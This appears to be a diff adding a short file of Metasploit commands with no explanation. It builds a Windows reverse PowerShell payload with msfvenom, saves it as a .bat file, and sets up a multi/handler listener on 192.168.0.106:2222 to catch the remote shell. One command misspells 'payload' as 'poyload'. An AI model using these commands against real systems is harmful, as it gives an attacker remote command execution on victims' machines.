@@ -1,0 +1,7 @@
+msfvenom -p cmd/windows/reverse_powershell LHOST=192.168.0.106  LPORT=2222 R > /root/Desktop/powershell.bat
+
+use exploit/multi/handler
+set poyload cmd/windows/reverse_powershell
+set lhost 192.168.0.106
+set lport 2222
+exploit
